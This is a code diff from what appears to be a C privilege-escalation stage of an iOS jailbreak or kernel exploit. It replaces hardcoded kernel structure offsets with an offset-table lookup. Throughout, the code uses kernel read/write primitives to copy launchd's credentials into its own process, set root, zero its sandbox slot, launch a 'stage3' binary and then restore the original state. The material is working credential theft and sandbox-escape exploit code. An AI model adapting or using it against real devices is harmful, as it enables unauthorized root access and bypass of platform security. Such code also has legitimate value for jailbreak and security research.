@@ -64,9 +64,9 @@ int main() {
   set_tfplatform(self_struct_proc);
 
   //borrow launchd ucred
-  uint64_t launchd_ucred = rk64(launchd_struct_proc + 0xf8);
-  uint64_t self_ucred = rk64(self_struct_proc + 0xf8);
-  wk64(self_struct_proc + 0xf8, launchd_ucred);
+  uint64_t launchd_ucred = rk64(launchd_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
+  uint64_t self_ucred = rk64(self_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
+  wk64(self_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), launchd_ucred);
 
   //elevate
   setuid(0);
@@ -85,19 +85,18 @@ int main() {
   chmod(stage3_path, 0755);
   
   //restore ucred
-  wk64(self_struct_proc + 0xf8, self_ucred);
+  wk64(self_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), self_ucred);
 
   //unsandbox
-  uint64_t saved_sb = rk64(rk64(self_ucred+0x78) + 8 + 8);
-  wk64(rk64(self_ucred+0x78) + 8 + 8, 0);
+  uint64_t saved_sb = rk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT));
+  wk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT), 0);
 
   launch(stage3_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 
   //restore sandbox
-  wk64(rk64(self_ucred+0x78) + 8 + 8, saved_sb);
+  wk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT), saved_sb);
 
-  sleep(5);
-
+  sleep(3);
 
   return 0;
 }
